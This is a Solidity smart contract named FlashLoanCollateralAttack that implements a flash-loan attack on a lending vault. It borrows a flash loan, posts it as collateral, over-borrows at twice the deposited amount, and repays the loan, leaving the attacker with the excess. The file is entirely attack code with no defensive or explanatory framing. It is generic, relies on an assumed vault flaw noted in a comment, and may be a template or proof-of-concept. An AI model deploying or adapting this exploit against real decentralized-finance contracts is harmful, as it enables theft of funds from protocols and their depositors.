// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ✅ Declare the missing flash loan provider interface
interface IFlashLoanProvider {
    function executeFlashLoan(uint256 amount) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IVault {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
    function withdrawCollateral(uint256 amount) external;
    function collateralToken() external view returns (address);
}

contract FlashLoanCollateralAttack {
    IVault public vault;
    IFlashLoanProvider public provider;
    IERC20 public token;
    address public owner;

    constructor(address _vault, address _provider) {
        vault = IVault(_vault);
        provider = IFlashLoanProvider(_provider);
        token = IERC20(vault.collateralToken());
        owner = msg.sender;
    }

    function attack(uint256 loanAmount) external {
        require(msg.sender == owner, "Only owner can initiate attack");
        provider.executeFlashLoan(loanAmount);
    }

    function executeOnFlashLoan(uint256 amount, uint256 fee) external {
        require(msg.sender == address(provider), "Only provider allowed");

        // Deposit flash-loaned tokens as collateral
        token.approve(address(vault), amount);
        vault.depositCollateral(amount);

        // Borrow against inflated collateral
        vault.borrow(amount * 2); // Assume exploit allows overborrowing

        // Optional: withdraw collateral
        // vault.withdrawCollateral(amount);

        // Repay loan
        token.transfer(address(provider), amount + fee);
    }
}
